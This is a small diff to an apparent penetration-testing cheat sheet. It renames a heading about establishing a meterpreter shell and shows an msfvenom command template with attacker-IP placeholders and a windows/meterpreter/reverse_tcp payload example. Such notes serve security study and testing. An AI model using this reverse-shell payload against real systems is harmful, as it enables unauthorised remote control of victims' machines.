@@ -13,7 +13,7 @@ Absolomb Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26
 Connect to ftp
 - `ftp [target-ip] -p [port]`
 
-Establish a meterpreter webshell
+Establish a meterpreter shell
 - `msfvenom -p [payload] LHOST=[attacker-ip] LPORT=[attacker-port] -f [filetype] -o [output name]`
   - Payload examples
     - `windows/meterpreter/reverse_tcp`
